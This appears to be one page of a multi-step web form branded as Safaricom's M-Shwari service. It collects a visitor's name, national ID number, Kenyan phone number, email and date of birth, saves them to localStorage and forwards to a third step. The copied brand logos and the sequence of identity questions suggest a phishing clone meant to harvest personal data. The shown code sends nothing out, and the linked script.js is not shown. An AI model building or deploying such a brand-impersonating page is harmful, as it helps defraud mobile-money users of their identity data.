<!DOCTYPE html>
<html>

<head>
    <title>Step 2 - Personal Details</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="stylesheet" href="style.css">
</head>

<body>

    <div class="header">
    <img src="logo-removebg-preview.png" alt="M-Shwari" id="main-logo">
    
</div>

    <div class="container">

        <h2 class="title">Personal Details</h2>

        <input id="fname" placeholder="First Name" pattern="[A-Za-z]+" title="Only letters allowed">
        <input id="lname" placeholder="Last Name" pattern="[A-Za-z]+" title="Only letters allowed">

        <input id="idNumber" placeholder="ID Number" inputmode="numeric" type="text">

        <input id="phone" value="+254" placeholder="Phone Number" inputmode="numeric" 
            title="Enter valid Kenyan number">

        <input id="email" placeholder="Email Address" type="email">

        <div class="dob-container" style="text-align: left; margin-bottom: 15px;">
    <label style="color: #666; font-size: 0.9rem; margin-left: 5px;">Date of Birth</label>
    <div style="display: flex; gap: 5px; margin-top: 5px;">
        <select id="dobDay" style="flex: 1; padding: 12px; border-radius: 8px; border: 1px solid #ccc;"></select>
        <select id="dobMonth" style="flex: 2; padding: 12px; border-radius: 8px; border: 1px solid #ccc;"></select>
        <select id="dobYear" style="flex: 1.5; padding: 12px; border-radius: 8px; border: 1px solid #ccc;"></select>
    </div>
</div>

        <p id="errorBox" style="color:red; text-align:center; display:none;"></p>
        
        <br><br><br>
        <button onclick="nextStep2()">Next</button>

    </div>

    <div class="footer">
    <br><br><br><br><br><br>
    <img src="safaricom-25.gif" alt="Safaricom" class="saf-footer" id="saf-logo">
</div>

<script>
    // Populate DOB Selectors
    document.addEventListener("DOMContentLoaded", function() {
        const d = document.getElementById('dobDay');
        const m = document.getElementById('dobMonth');
        const y = document.getElementById('dobYear');

        const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];

        for(let i=1; i<=31; i++) d.options.add(new Option(i, i < 10 ? '0'+i : i));
        months.forEach((month, index) => m.options.add(new Option(month, index + 1 < 10 ? '0'+(index+1) : index+1)));
        
        const currentYear = new Date().getFullYear();
        for(let i=currentYear-18; i>=currentYear-80; i--) y.options.add(new Option(i, i));
    });
</script>

    <script>
        function nextStep2() {
            const fname = document.getElementById("fname").value.trim();
            const lname = document.getElementById("lname").value.trim();
            const idNumber = document.getElementById("idNumber").value.trim();
            const phone = document.getElementById("phone").value.trim();
            const email = document.getElementById("email").value.trim();

            const nameRegex = /^[A-Za-z]+$/;
            // Updated regex for Kenyan numbers: starts with +254 then 7 or 1, then 8 digits
            const kenyaPhoneRegex = /^\+254[17][0-9]{8}$/;
            const idRegex = /^[0-9]+$/;

            if (!fname || !lname || !idNumber || !phone || !email) {
                showError("Please fill all required fields");
                return;
            }

            if (!idRegex.test(idNumber)) {
                showError("ID Number must contain only numbers");
                return;
            }

            if (!nameRegex.test(fname) || !nameRegex.test(lname)) {
                showError("Names must contain only letters");
                return;
            }

            if (!kenyaPhoneRegex.test(phone)) {
                showError("Enter valid Kenyan phone (+254XXXXXXXXX)");
                return;
            }

            // Save Data
            localStorage.setItem("fname", fname);
            localStorage.setItem("lname", lname);
            localStorage.setItem("fullName", fname + " " + lname);
            localStorage.setItem("idNumber", idNumber);
            localStorage.setItem("phone", phone);
            localStorage.setItem("email", email);

            // Move to Step 3 (step3.html)
            showLoaderAndGo("step3.html");
        }

        function showError(msg) {
            const err = document.getElementById("errorBox");
            if (err) {
                err.innerText = msg;
                err.style.display = "block";
            }
        }
    </script>

    <script src="script.js"></script>
    <div id="pageLoader" class="loader" style="display:none;"></div>

</body>
</html>
